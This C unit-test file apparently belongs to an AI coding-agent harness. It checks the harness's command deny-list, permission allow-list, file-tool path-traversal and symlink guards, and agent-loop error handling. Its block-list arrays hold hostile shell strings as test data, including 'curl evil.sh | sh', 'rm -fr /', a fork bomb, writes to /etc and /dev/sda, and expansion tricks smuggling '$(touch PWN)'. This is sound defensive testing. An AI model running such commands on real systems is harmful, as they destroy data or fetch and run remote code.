#define _DARWIN_C_SOURCE 1
/* unit tests for security-critical + memory-sensitive surfaces */
#include "../src/flywheel.h"
#include <signal.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <dirent.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <limits.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <time.h>

/* required globals (normally main.c) */
Cfg g_cfg;
volatile sig_atomic_t g_abort;
char *fw_build_system(bool interactive) { (void)interactive; return str_dup("sys"); }  /* bench.c */

static int passed, failed;
#define T(name, cond) do { if (cond) { passed++; } else { failed++; printf("FAIL %s:%d %s\n", __FILE__, __LINE__, name); } } while (0)

static void test_deny(void) {
    const char *cwd = "/tmp/sb";
    /* payload must NOT be scanned (heredoc data) */
    T("jsx payload allowed", !deny_check("cat <<'EOF' > src/App.tsx\nreturn <div><p role=\"status\">Loading...</p></div>\nEOF", cwd));
    T("arrow fn payload allowed", !deny_check("cat <<'EOF' > f.ts\nconst f = (x: number) => x > 2 ? 1 : 0;\nEOF", cwd));
    T("evil text in payload allowed", !deny_check("cat <<'EOF' > x.ts\nconst s = \"echo hi > /etc/passwd\";\nEOF", cwd));
    /* real attacks must be blocked */
    T("abs path blocked", deny_check("echo x > /etc/evil", cwd) != NULL);
    T("dotdot blocked", deny_check("cat <<'EOF' > ../escape.ts\nx\nEOF", cwd) != NULL);
    T("tilde blocked", deny_check("echo x > ~/out", cwd) != NULL);
    T("sudo blocked", deny_check("sudo rm x", cwd) != NULL);
    T("fork bomb blocked", deny_check(":(){ :|:& };:", cwd) != NULL);
    /* legit redirects inside cwd pass */
    T("relative write ok", !deny_check("cat <<'EOF' > src/a.ts\nx\nEOF", cwd));
    T("tmp write ok", !deny_check("echo hi > /tmp/out.txt", cwd));
    T("cwd-abs write ok", !deny_check("echo hi > /tmp/sb/out.txt", cwd));
}

static void test_heredoc_fix(void) {
    /* collision: EOF inside payload */
    char *r = heredoc_fix("cat <<'EOF' > f.ts\nconst EOF = 1;\nEOF\n");
    T("collision rewritten", r && strstr(r, "FW_EOF") != NULL);
    free(r);
    /* no collision: untouched */
    const char *plain = "cat <<'EOF' > f.ts\nhello\nEOF\n";
    r = heredoc_fix(plain);
    T("no-collision untouched", r && !strcmp(r, plain));
    free(r);
    /* no heredoc: untouched */
    r = heredoc_fix("ls -la");
    T("no heredoc untouched", r && !strcmp(r, "ls -la"));
    free(r);
}

static void test_args_extract(void) {
    /* clean */
    char *r = args_extract_command("{\"command\": \"ls -la\"}");
    T("clean extract", r && !strcmp(r, "ls -la"));
    free(r);
    /* raw control chars inside string (invalid json, lenient path) */
    char raw[256];
    snprintf(raw, sizeof raw, "{\"command\": \"cat <<'EOF'\nline2\nEOF\"}");
    r = args_extract_command(raw);
    T("ctrl-char repaired", r && strstr(r, "line2") != NULL);
    free(r);
    /* truncated json — auto-close */
    r = args_extract_command("{\"command\": \"echo hello");
    T("truncated handled", r != NULL);
    free(r);
    /* empty */
    r = args_extract_command("");
    T("empty safe", r && !*r);
    free(r);
    /* garbage */
    r = args_extract_command("not json at all");
    T("garbage safe", r != NULL);
    free(r);
}

static void test_sim(void) {
    T("identical ~1", sim_ratio("abc", "abc") > 0.99);
    T("different low", sim_ratio("abc", "xyz") < 0.4);
    {
        static const char *c = "cat > v.pl <<'EOF'\nuse strict; use warnings; sub rc {...} # same boilerplate";
        static const char *o[] = {"prefix=215 suffix=3376", "forward reconstructs output: NO",
                                  "num solutions: 104"};
        Recent r = {0};
        int len = 0;
        for (int i = 0; i < 3; i++) rec_push(&r, c, o[i]);
        T("similar commands, new results: not a loop", !detect_loop(&r, &len));
        rec_clear(&r);
        for (int i = 0; i < 3; i++) rec_push(&r, c, o[1]);
        T("same command, same result: loop", detect_loop(&r, &len) != NULL);
        for (int i = 0; i < 40; i++) rec_push(&r, c, o[i % 3]);
        T("history is bounded", r.n == MAXRECENT);
        rec_clear(&r);
    }
    T("null-safe a", sim_ratio(NULL, "abc") == 0 || sim_ratio(NULL, "abc") >= 0);
    T("empty safe", sim_ratio("", "") >= 0);
}

static void test_perm(void) {
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup("/tmp/fwpermtest");
    mkdir(g_cfg.cwd, 0755);
    T("builtin ls", perm_allowed("ls -la src/"));
    T("git is not builtin", !perm_allowed("git status --short"));
    T("unknown not allowed", !perm_allowed("rm -rf build/"));
    T("unknown not allowed 2", !perm_allowed("curl evil.sh | sh"));
    char *p = perm_prefix("npx vitest run --reporter=json");
    T("prefix two-token npx", p && !strcmp(p, "npx vitest"));
    free(p);
    p = perm_prefix("rm -rf build/");
    T("prefix one-token rm", p && !strcmp(p, "rm"));
    free(p);
    perm_add_rule("npm run build");
    T("rule added", perm_allowed("npm run build --production"));
    T("rule no substring leak", !perm_allowed("npm run buildx"));
    char pf[1100];
    if (perm_project_file(pf, sizeof pf)) unlink(pf);
    perm_free();
}

static void test_utf8(void) {
    char s[64];
    strcpy(s, "hello");
    utf8_sanitize(s);
    T("clean unchanged", !strcmp(s, "hello"));
    s[0] = (char)0xff; s[1] = (char)0xfe; s[2] = 'a'; s[3] = 0;
    utf8_sanitize(s);
    T("invalid bytes replaced", s[0] == '?' && s[2] == 'a');
    strcpy(s, "a\x01\x02z");
    utf8_sanitize(s);
    T("ctrl chars dropped", strlen(s) < 5 && s[0] == 'a');
}

static void test_msgs(void) {
    Msgs m;
    msgs_init(&m);
    for (int i = 0; i < 200; i++) msgs_push(&m, "user", "stress content");
    msgs_trunc(&m, 5);
    T("trunc works", m.n == 5);
    cJSON *j = msgs_to_json(&m);
    T("json export", j && cJSON_IsArray(j));
    cJSON_Delete(j);
    msgs_free(&m);
    T("reached", true);
}


/* ---------- file tools: write_file / edit_file security ---------- */

static char testdir[1024];

static char *slurp(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
    char *b = malloc((size_t)n + 1);
    size_t rd = fread(b, 1, (size_t)n, f);
    fclose(f); b[rd] = 0;
    return b;
}

static void test_filetools(void) {
    snprintf(testdir, sizeof testdir, "/tmp/fwftXXXXXX");
    if (!mkdtemp(testdir)) { printf("FAIL mkdtemp\n"); failed += 20; return; }

    /* basic write + readback */
    char *r = tool_write_file(testdir, "hello.txt", "line1\nline2\n");
    T("write ok", r && !strncmp(r, "ok:", 3));
    free(r);
    char p[1100]; snprintf(p, sizeof p, "%s/hello.txt", testdir);
    char *c = slurp(p);
    T("write content exact", c && !strcmp(c, "line1\nline2\n"));
    free(c);

    /* nested parent creation */
    r = tool_write_file(testdir, "a/b/c/deep.ts", "export {}\n");
    T("nested write ok", r && !strncmp(r, "ok:", 3));
    free(r);
    snprintf(p, sizeof p, "%s/a/b/c/deep.ts", testdir);
    c = slurp(p);
    T("nested content exact", c && !strcmp(c, "export {}\n"));
    free(c);

    /* traversal attacks */
    r = tool_write_file(testdir, "../escape.txt", "x");
    T("../ rejected", r && strstr(r, "escape"));
    free(r);
    r = tool_write_file(testdir, "a/../../escape.txt", "x");
    T("nested ../ rejected", r && strstr(r, "escape"));
    free(r);
    r = tool_write_file(testdir, "/etc/evil.txt", "x");
    T("abs outside rejected", r && strstr(r, "escape"));
    free(r);
    r = tool_write_file(testdir, "/tmp/evil-should-not-match.txt", "x");
    T("abs /tmp rejected (outside cwd)", r && strstr(r, "escape"));
    free(r);

    /* cwd-prefix confusion: /tmp/fwftX vs /tmp/fwftXevil */
    char evilpath[1100];
    snprintf(evilpath, sizeof evilpath, "%sevil/x.txt", testdir);
    r = tool_write_file(testdir, evilpath, "x");
    T("cwd-prefix-confusion rejected", r && strstr(r, "escape"));
    free(r);

    /* absolute path INSIDE cwd accepted */
    snprintf(evilpath, sizeof evilpath, "%s/inside.txt", testdir);
    r = tool_write_file(testdir, evilpath, "yes\n");
    T("abs inside ok", r && !strncmp(r, "ok:", 3));
    free(r);

    /* control chars in path */
    r = tool_write_file(testdir, "bad\tname.txt", "x");
    T("ctrl char rejected", r && strstr(r, "control"));
    free(r);

    /* symlink escape: dir symlink inside cwd -> outside */
    char outside[1100]; snprintf(outside, sizeof outside, "/tmp/fwoutXXXXXX");
    if (mkdtemp(outside)) {
        char linkp[1100]; snprintf(linkp, sizeof linkp, "%s/slink", testdir);
        if (!symlink(outside, linkp)) {
            r = tool_write_file(testdir, "slink/pwned.txt", "x");
            T("dir symlink escape rejected", r && strstr(r, "symlink"));
            free(r);
            char chk[1100]; snprintf(chk, sizeof chk, "%s/pwned.txt", outside);
            T("no file written outside", access(chk, F_OK) != 0);
        }
        /* file symlink escape */
        char realout[1100]; snprintf(realout, sizeof realout, "%s/real.txt", outside);
        FILE *f = fopen(realout, "w"); if (f) { fputs("orig", f); fclose(f); }
        char flink[1100]; snprintf(flink, sizeof flink, "%s/flink.txt", testdir);
        if (!symlink(realout, flink)) {
            r = tool_write_file(testdir, "flink.txt", "pwned");
            T("file symlink escape rejected", r && strstr(r, "symlink"));
            free(r);
            char *ow = slurp(realout);
            T("outside file untouched", ow && !strcmp(ow, "orig"));
            free(ow);
        }
    }

    /* edit_file: unique match */
    r = tool_write_file(testdir, "edit.txt", "alpha\nbeta\ngamma\n");
    free(r);
    r = tool_edit_file(testdir, "edit.txt", "beta", "BETA");
    T("edit ok", r && !strncmp(r, "ok:", 3));
    free(r);
    snprintf(p, sizeof p, "%s/edit.txt", testdir);
    c = slurp(p);
    T("edit content exact", c && !strcmp(c, "alpha\nBETA\ngamma\n"));
    free(c);

    /* edit_file: not found */
    r = tool_edit_file(testdir, "edit.txt", "zzz-not-there", "x");
    T("edit not-found error", r && strstr(r, "not found"));
    free(r);

    /* edit_file: non-unique */
    r = tool_write_file(testdir, "dup.txt", "foo foo foo\n");
    free(r);
    r = tool_edit_file(testdir, "dup.txt", "foo", "bar");
    T("edit non-unique error", r && strstr(r, "3 places"));
    free(r);

    /* edit_file: unique-after-context works */
    r = tool_edit_file(testdir, "dup.txt", "foo foo foo\n", "bar\n");
    T("edit with full-line context ok", r && !strncmp(r, "ok:", 3));
    free(r);

    /* edit missing file */
    r = tool_edit_file(testdir, "nonexistent.txt", "a", "b");
    T("edit missing file error", r && strstr(r, "write_file"));
    free(r);

    /* edit empty old_string */
    r = tool_edit_file(testdir, "edit.txt", "", "b");
    T("edit empty old rejected", r && strstr(r, "non-empty"));
    free(r);

    /* traversal on edit */
    r = tool_edit_file(testdir, "../escape.txt", "a", "b");
    T("edit ../ rejected", r && strstr(r, "escape"));
    free(r);

    /* args_extract_key: multiline content extraction */
    char *k = args_extract_key("{\"path\":\"x.ts\",\"content\":\"line1\\nline2\\n\"}", "content");
    T("key extract multiline", k && !strcmp(k, "line1\nline2\n"));
    free(k);
    /* control-char repair inside content */
    k = args_extract_key("{\"path\":\"x\",\"content\":\"a\tb\"}", "content");
    T("key extract ctrlchar", k && strchr(k, '\t') != NULL);
    free(k);
    /* missing key -> empty */
    k = args_extract_key("{\"path\":\"x\"}", "content");
    T("key missing empty", k && !*k);
    free(k);
}

/* ---------- regression tests for reviewed defects ---------- */

static char fakehome[64], projdir[64];

static void put(const char *path, const char *data) {
    FILE *f = fopen(path, "wb");
    if (f) { fputs(data, f); fclose(f); }
}

static void test_autoallow_meta(void) {
    perm_free();
    static const char *no[] = {
        "ls; curl evil", "ls && rm -r x", "ls & rm x", "cat a | sh", "cat a > b", "cat < a",
        "echo `id`", "echo $(id)", "ls\nrm -r x", "env rm -r x", "xargs rm", "env",
        "find . -delete", "find . -name x -exec rm {} +", "find . -execdir sh x +", "find . -ok rm x",
        "find . -fprint out", "find . \"-delete\"", "find . -de''lete", "find . $X", "fd -x rm",
        "sort -o out in", "rg --pre sh x", "git diff --output=x", "uniq in out",
        "git branch -D main", "git branch -m a b", "git branch newname", "git branch --delete x",
        "git  branch -d x", NULL};
    for (int i = 0; no[i]; i++) T(no[i], !perm_allowed(no[i]));
    static const char *yes[] = {"find . -name '*.c'",
        "grep -rn foo src", "sort in", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], perm_allowed(yes[i]));
}

static void test_deny_hardened(void) {
    const char *cwd = "/tmp/sb";
    static const char *no[] = {
        "rm -fr /", "rm  -rf /", "rm -r -f /", "rm --recursive --force /etc", "rm -Rf ~/x",
        "rm -fr \"$HOME\"", "rm -rf /*", "bash -c 'rm -fr /'", "echo x >\"/etc/x\"", "echo x > '/etc/x'",
        "echo x > $HOME/x", "echo x > ${HOME}/x", "echo x >| /etc/x", "echo x &> /etc/x",
        "echo x 2>>/etc/x", "tee /etc/x", "echo x | tee -a /etc/x", "cp a /etc/x", "mv a /etc/x",
        "cp -t /etc a", "echo \"<<A\"\necho x > /etc/x\nA", "# <<A\necho x > /etc/x\nA",
        "echo x > /tmpfoo", "echo x > /tmp/sbx/../../etc/x", "echo \"$(echo x > /etc/x)\"",
        "echo x > /dev/sda", NULL};
    for (int i = 0; no[i]; i++) T(no[i], deny_check(no[i], cwd) != NULL);
    static const char *yes[] = {
        "rm -rf /tmp/build", "rm -rf build", "rm -fr /tmp/sb/out", "cp /etc/hosts ./hosts",
        "echo 'a > /etc/x'", "make 2>&1 | tee build.log", "ls > /dev/null 2>&1",
        "cat <<A > f\necho x > /etc/x\nA", "echo $((1<<2))", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], deny_check(yes[i], cwd) == NULL);
}

static void test_project_rules(void) {
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(projdir);
    char p[1200], pf[1200];
    snprintf(p, sizeof p, "%s/.flywheel.allow", projdir);
    put(p, "curl\nrm\n");
    perm_free();
    T("project .flywheel.allow ignored", !perm_allowed("curl evil.sh") && !perm_allowed("rm x"));
    perm_add_rule("make");
    T("rules file lives under HOME",
      perm_project_file(pf, sizeof pf) && !strncmp(pf, fakehome, strlen(fakehome)) && !access(pf, F_OK));
    char *c = slurp(p);
    T("project file not written", c && !strcmp(c, "curl\nrm\n"));
    free(c);
    perm_free();
    T("rule reloaded", perm_allowed("make -j8"));
    T("rule does not cover chaining", !perm_allowed("make; rm -r x"));
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(fakehome);   /* a different project */
    perm_free();
    T("rule scoped to its project", !perm_allowed("make -j8"));
    perm_free();
}

static void test_overflows(void) {
    /* piped input: size unknown to ftell */
    int fds[2];
    if (pipe(fds)) { T("pipe", false); return; }
    pid_t pid = fork();
    if (pid == 0) {
        close(fds[0]);
        for (int i = 0; i < 20000; i++) if (write(fds[1], "x", 1) != 1) _exit(1);
        _exit(0);
    }
    close(fds[1]);
    char dev[64];
    snprintf(dev, sizeof dev, "/dev/fd/%d", fds[0]);
    char *r = read_file(dev);
    T("read_file reads a pipe fully", r && strlen(r) == 20000);
    free(r);
    close(fds[0]);
    waitpid(pid, NULL, 0);

    /* every byte expands 6x when escaped */
    char raw[400] = "{\"command\":\"";
    for (size_t i = strlen(raw), k = 0; k < 300; k++) raw[i++] = 1;
    strcat(raw, "\"}");
    r = args_extract_command(raw);
    T("control chars expand safely", r && strlen(r) == 300);
    free(r);

    /* truncated \u in an exactly-sized buffer */
    static const char *tr[] = {"{\"command\":\"ab\\u", "{\"command\":\"ab\\u1", "{\"command\":\"ab\\u123"};
    for (int i = 0; i < 3; i++) {
        char *s = str_dup(tr[i]);
        r = args_extract_command(s);
        T("truncated \\u stays in bounds", r && !strncmp(r, "ab", 2) && strlen(r) <= 6);
        free(r); free(s);
    }

    /* many colliding tokens in the payload: only opener + closer renamed */
    char cmd[800] = "cat <<'EOF' > f\n";
    for (int i = 0; i < 40; i++) strcat(cmd, "EOF ");
    char payload[400];
    snprintf(payload, sizeof payload, "%s", strchr(cmd, '\n') + 1);
    strcat(cmd, "\nEOF\n");
    r = heredoc_fix(cmd);
    T("payload bytes untouched", r && strstr(r, payload));
    T("opener renamed", r && strstr(r, "<<'FW_EOF_"));
    T("closer renamed", r && strstr(r, "\nFW_EOF_"));
    free(r);
    r = heredoc_fix("cat <<EOF > a\nx\nEOF\necho y\nEOF\n");
    T("bare delimiter line in payload stays data", r && strstr(r, "\nx\nEOF\necho y\nFW_EOF_"));
    free(r);
    const char *two = "cat <<EOF > a\nx\nEOF\ncat <<EOF > b\ny\nEOF\n";
    r = heredoc_fix(two);
    T("sequential heredocs untouched", r && !strcmp(r, two));
    free(r);
}

static void test_symlinks(void) {
    char dir[] = "/tmp/fwsymXXXXXX", out[] = "/tmp/fwsymoutXXXXXX";
    if (!mkdtemp(dir) || !mkdtemp(out)) { T("mkdtemp", false); return; }
    char target[256], l[256], chk[256];
    snprintf(target, sizeof target, "%s/dangling.txt", out);
    snprintf(l, sizeof l, "%s/dl", dir);
    T("link dangling", !symlink(target, l));
    char *r = tool_write_file(dir, "dl", "pwned");
    T("dangling link rejected", r && strstr(r, "symlink"));
    free(r);
    T("dangling target not created", access(target, F_OK) != 0);
    snprintf(l, sizeof l, "%s/od", dir);
    T("link outdir", !symlink(out, l));
    r = tool_write_file(dir, "od/newdir/f", "pwned");
    T("mkdir through outside link rejected", r && strstr(r, "symlink"));
    free(r);
    snprintf(chk, sizeof chk, "%s/newdir", out);
    T("no directory created outside", access(chk, F_OK) != 0);
    snprintf(l, sizeof l, "%s/in", dir);
    snprintf(chk, sizeof chk, "%s/real", dir);
    mkdir(chk, 0755);
    T("link inside", !symlink(chk, l));
    r = tool_write_file(dir, "in/ok.txt", "fine");
    T("inside link still works", r && !strncmp(r, "ok:", 3));
    free(r);
}

static void test_bounded_output(void) {
    char dir[] = "/tmp/fwboundXXXXXX";   /* commands check their tree: keep it private */
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    time_t t0 = time(NULL);
    char *o = run_bash("(perl -e 'alarm 8; $|=1; print \"y\"x8192 while 1') & echo hi", dir, 3);
    T("background writer does not hang the drain", time(NULL) - t0 < 6 && strlen(o) <= 4096);
    free(o);
    o = run_bash("echo HEAD; head -c 4000000 /dev/zero | tr '\\0' a; echo TAIL", dir, 10);
    T("large output keeps head and tail, no timeout",
      !strncmp(o, "HEAD", 4) && strstr(o, "TAIL") && !strstr(o, "[timeout") && strlen(o) <= 4096);
    free(o);
    rmdir(dir);
}

static void test_copy_file(void) {
    char src[128], dst[128];
    snprintf(src, sizeof src, "%s/bin.src", fakehome);
    snprintf(dst, sizeof dst, "%s/bin.dst", fakehome);
    FILE *f = fopen(src, "wb");
    fwrite("a\0b\xff", 1, 4, f);
    fclose(f);
    chmod(src, 0751);
    T("copy ok", !fw_copy_file(src, dst));
    struct stat st;
    T("mode preserved", !stat(dst, &st) && (st.st_mode & 07777) == 0751 && st.st_size == 4);
    char got[4] = {0};
    f = fopen(dst, "rb");
    T("bytes preserved", f && fread(got, 1, 4, f) == 4 && !memcmp(got, "a\0b\xff", 4));
    if (f) fclose(f);
}

/* ---------- canned HTTP server ---------- */

static int nreq;   /* request number inside the server process */
static const char *req_dump;   /* if set, the server appends every request there */

/* serve reply(n) to the n-th request until killed */
static pid_t serve(const char *(*reply)(int)) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {.sin_family = AF_INET};
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    socklen_t al = sizeof a;
    if (bind(s, (struct sockaddr *)&a, sizeof a) || listen(s, 8) ||
        getsockname(s, (struct sockaddr *)&a, &al)) return -1;
    free(g_cfg.endpoint);
    char ep[64];
    snprintf(ep, sizeof ep, "http://127.0.0.1:%d/v1", ntohs(a.sin_port));
    g_cfg.endpoint = str_dup(ep);
    fflush(stdout);
    pid_t pid = fork();
    if (pid) { close(s); return pid; }
    alarm(60);
    for (;;) {
        int c = accept(s, NULL, NULL);
        if (c < 0) _exit(0);
        static char req[1 << 18];
        size_t len = 0;
        ssize_t n;
        while ((n = read(c, req + len, sizeof req - 1 - len)) > 0) {
            len += (size_t)n;
            req[len] = 0;
            char *body = strstr(req, "\r\n\r\n"), *cl = strstr(req, "Content-Length:");
            if (body && (!cl || strlen(body + 4) >= (size_t)atol(cl + 15))) break;
        }
        FILE *dump = req_dump ? fopen(req_dump, "a") : NULL;
        if (dump) { fwrite(req, 1, len, dump); fclose(dump); }
        const char *r = reply(nreq++);
        if (write(c, r, strlen(r)) < 0) _exit(1);
        close(c);
    }
}

static void stop(pid_t p) { kill(p, SIGKILL); waitpid(p, NULL, 0); }

#define OK_HDR "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n"
#define DELTA "data: {\"choices\":[{\"delta\":{\"content\":\"partial\"}}]}\n\n"
#define STOPPED "data: {\"choices\":[{\"delta\":{\"content\":\"DONE\"},\"finish_reason\":\"stop\"}]}\n\n"

static const char *bad_reply;
static const char *reply_fixed(int n) { (void)n; return bad_reply; }

static void check_chat(const char *name, const char *reply, bool want_err, const char *frag) {
    bad_reply = reply;
    pid_t p = serve(reply_fixed);
    Msgs m;
    msgs_init(&m);
    msgs_push(&m, "user", "hi");
    StreamCb cb = {.stream = true};
    ChatResp *r = chat(&m, &cb);
    T(name, r && (want_err ? r->error != NULL : r->error == NULL));
    if (frag) T(name, r && r->error && strstr(r->error, frag));
    chat_resp_free(r);
    msgs_free(&m);
    stop(p);
}

static void test_http_errors(void) {
    check_chat("good stream", OK_HDR STOPPED "data: [DONE]\n\n", false, NULL);
    check_chat("DONE without trailing blank line", OK_HDR DELTA "data: [DONE]\n", false, NULL);
    check_chat("503 is a retryable error", "HTTP/1.1 503 Unavailable\r\n\r\nService Unavailable", true, "http: status 503");
    check_chat("400 is an error", "HTTP/1.1 400 Bad\r\n\r\n" STOPPED, true, "status 400");
    check_chat("no finish_reason or DONE", OK_HDR DELTA, true, "finish_reason");
    check_chat("error object mid-stream", OK_HDR DELTA "data: {\"error\":{\"message\":\"boom\"}}\n\ndata: [DONE]\n\n", true, "boom");
    check_chat("short Content-Length body",
               "HTTP/1.1 200 OK\r\nContent-Length: 5000\r\n\r\n" STOPPED, true, NULL);
    check_chat("bad chunk size",
               "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\nzz\r\n" STOPPED, true, NULL);
    check_chat("chunked body cut before last chunk",
               "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n", true, NULL);
    bad_reply = "HTTP/1.1 404 No\r\n\r\nnope";
    pid_t p = serve(reply_fixed);
    char *g = http_get("/models");
    T("http_get non-2xx is NULL", g == NULL);
    free(g);
    stop(p);
}

/* ---------- agent loop ---------- */

/* SSE reply carrying tool calls: (name, arguments) pairs */
static const char *tool_reply(const char *finish, int n, const char *const *calls) {
    static char buf[8192];
    cJSON *root = cJSON_CreateObject(), *chs = cJSON_AddArrayToObject(root, "choices");
    cJSON *ch = cJSON_CreateObject();
    cJSON_AddItemToArray(chs, ch);
    cJSON *tcs = cJSON_AddArrayToObject(cJSON_AddObjectToObject(ch, "delta"), "tool_calls");
    for (int i = 0; i < n; i++) {
        cJSON *tc = cJSON_CreateObject();
        cJSON_AddNumberToObject(tc, "index", i);
        cJSON_AddStringToObject(tc, "id", "c");
        cJSON *fn = cJSON_AddObjectToObject(tc, "function");
        cJSON_AddStringToObject(fn, "name", calls[2 * i]);
        cJSON_AddStringToObject(fn, "arguments", calls[2 * i + 1]);
        cJSON_AddItemToArray(tcs, tc);
    }
    cJSON_AddStringToObject(ch, "finish_reason", finish);
    char *j = cJSON_PrintUnformatted(root);
    snprintf(buf, sizeof buf, OK_HDR "data: %s\n\ndata: [DONE]\n\n", j);
    free(j);
    cJSON_Delete(root);
    return buf;
}

static const char *agent_finish_reason;
static const char *const *agent_calls;
static int agent_ncalls, agent_tool_turns;
static const char *reply_agent(int n) {
    if (n < agent_tool_turns) return tool_reply(agent_finish_reason, agent_ncalls, agent_calls);
    return OK_HDR STOPPED "data: [DONE]\n\n";
}

static void abort_on_out(const char *o, void *ud) { (void)o; (void)ud; g_abort = 1; }

static const char *run_agent(Msgs *m, const char *finish, int ncalls, const char *const *calls,
                             int turns, Ui *ui) {
    agent_finish_reason = finish; agent_calls = calls; agent_ncalls = ncalls; agent_tool_turns = turns;
    pid_t p = serve(reply_agent);
    const char *fin = agent_run(m, ui, NULL, 0);
    stop(p);
    return fin;
}

static void new_task(Msgs *m) {
    msgs_init(m);
    msgs_push(m, "system", "sys");
    msgs_push(m, "user", "OLD TASK");
    msgs_push(m, "assistant", "old answer");
    msgs_push(m, "user", "CURRENT TASK");
}

static bool has_msg(const Msgs *m, const char *role, const char *frag) {
    for (int i = 0; i < m->n; i++)
        if (!strcmp(m->v[i].role, role) && m->v[i].content && strstr(m->v[i].content, frag)) return true;
    return false;
}

static void test_agent(void) {
    char dir[] = "/tmp/fwagentXXXXXX", p[256];
    if (!mkdtemp(dir)) { T("mkdtemp", false); return; }
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(dir);
    g_cfg.maxturns = 20; g_cfg.maxtok = 100; g_cfg.cmd_timeout = 5; g_cfg.gate_every = 0; g_cfg.max_gates = 0;
    free(g_cfg.model);
    g_cfg.model = str_dup("m");
    Ui ui = {.interactive = true};
    Msgs m;

    snprintf(p, sizeof p, "%s/keep.txt", dir);
    put(p, "original");
    static const char *const cut[] = {
        "write_file", "{\"path\":\"keep.txt\",\"content\":\"half of fi",       /* truncated */
        "write_file", "{\"path\":\"keep.txt\",\"content\":\"closed\"",          /* auto-closable */
        "write_file", "path \"path\": \"keep.txt\", \"content\": \"scanned\"",  /* key-scannable */
        "edit_file", "{\"path\":\"keep.txt\",\"old_string\":\"orig\"}"};        /* no new_string */
    new_task(&m);
    run_agent(&m, "tool_calls", 4, cut, 1, &ui);
    char *c = slurp(p);
    T("broken arguments never reach file tools", c && !strcmp(c, "original"));
    free(c);
    T("model told why", has_msg(&m, "tool", "not complete valid JSON") && has_msg(&m, "tool", "new_string"));
    msgs_free(&m);

    static const char *const whole[] = {
        "write_file", "{\"path\":\"keep.txt\",\"content\":\"clobbered\"}",
        "bash", "{\"command\":\"touch ran.txt\"}"};
    new_task(&m);
    run_agent(&m, "length", 2, whole, 1, &ui);
    c = slurp(p);
    T("finish=length: file untouched", c && !strcmp(c, "original"));
    free(c);
    snprintf(p, sizeof p, "%s/ran.txt", dir);
    T("finish=length: command not run", access(p, F_OK) != 0);
    msgs_free(&m);
    new_task(&m);
    const char *fin = run_agent(&m, "length", 0, NULL, 1, &ui);
    T("length finish string survives", !strcmp(fin, "length"));
    msgs_free(&m);

    static const char *const batch[] = {
        "bash", "{\"command\":\"true\"}", "bash", "{\"command\":\"touch second.txt\"}"};
    Ui esc = {.interactive = true, .emit_out = abort_on_out};
    new_task(&m);
    fin = run_agent(&m, "tool_calls", 2, batch, 1, &esc);
    g_abort = 0;
    snprintf(p, sizeof p, "%s/second.txt", dir);
    T("Esc stops the rest of the batch", !strcmp(fin, "aborted") && access(p, F_OK) != 0);
    T("every call still answered", m.n >= 7 && has_msg(&m, "tool", "aborted by user"));
    msgs_free(&m);

    static const char *const same[] = {"bash", "{\"command\":\"true\"}"};
    new_task(&m);
    run_agent(&m, "tool_calls", 1, same, 6, &ui);
    T("loop reset happened", has_msg(&m, "user", "Context reset"));
    T("current task survives reset", has_msg(&m, "user", "CURRENT TASK"));
    msgs_free(&m);
}

/* second review round: expansion tricks, write flags, strict bash args */
static void test_autoallow_expansion(void) {
    free(g_cfg.cwd);
    g_cfg.cwd = str_dup(projdir);
    perm_free();
    static const char *no[] = {
        "echo ${x:=z[\\$\\(touch\\ PWN\\)]} ${PATH:x}", "echo $HOME", "echo \"$HOME\"",
        "ls ${HOME}", "echo {a,b}", "echo (x)", "echo \\x", "echo \"a\\\"b\"", "cat ~/x", "ls *",
        "uniq a?", "ls [ab]", "echo 'open",
        "rg --hostname-bin=sh x", "rg --hostname-bin sh x", "rg -z x", "rg -iz x",
        "rg --search-zip x", "rg --pre=sh x",
        "uniq - keep", "uniq in -c", "uniq in --", "git log --format=%+GG -1", "git log --format='% G?' -1",
        "git branch --format='%(signature)'", "uniq -- a -b", "uniq -c -- -a -b",
        "file -C", "file --compile", "file --comp", "file -bC m", "file -z a", "file -S a",
        "npx tsc --noEmit", "npx tsc --noEmit -p tsconfig.json",
        "npx tsc", "npx tsc --outDir /etc", "npx tsc --noEmit --outDir /etc",
        "npx tsc --noEmit false", "npx tsc -b", "npx tsc --noEmit --incremental",
        "sort --co=sh in", "git diff --outpu=x", "git diff --ext-diff", "git show --textconv x",
        "git log --show-signature", "git log --format=%G?", "printf -v 'a[$x]' y",
        "printf '%n' PATH", "test -v 'a[$x]'", NULL};
    for (int i = 0; no[i]; i++) T(no[i], !perm_allowed(no[i]));
    {
        static const char *git[] = {"git status", "git diff", "git log", "git show", "git branch",
            "git rev-parse HEAD", NULL};
        for (int i = 0; git[i]; i++) T(git[i], !perm_allowed(git[i]));
    }
    perm_add_rule("git diff");
    perm_add_rule("git log");
    static const char *yes[] = {
        "echo '${x} (y) \\z *'",
        "git diff HEAD~1", "git log --oneline", "git diff --text", "git diff --exit-code",
        "uniq -c in", "uniq -", "file -b x", "file --mime-type x", "rg -n foo src",
        "grep -rn 'f(x)' src", "printf '%s\\n' x", "test -f x", NULL};
    for (int i = 0; yes[i]; i++) T(yes[i], perm_allowed(yes[i]));
    perm_add_rule("make");
    T("saved rule: no expansion", !perm_allowed("make ${x:=y}") && !perm_allowed("make \"$X\""));
    T("saved rule: single-quoted text ok", perm_allowed("make 'a(1)'"));
    perm_add_rule("X=1");
    T("assignment prefix never auto-allowed", !perm_allowed("X=1 rm -r build"));
    {
        static const char *blocked[] = {"echo x > $'\\x2fetc/evil'", "echo x > $\"/etc/evil\"",
            "echo x > $'/etc/evil'", "rm -rf {..,x}", "rm -rf .*", "rm -rf sub/.?",
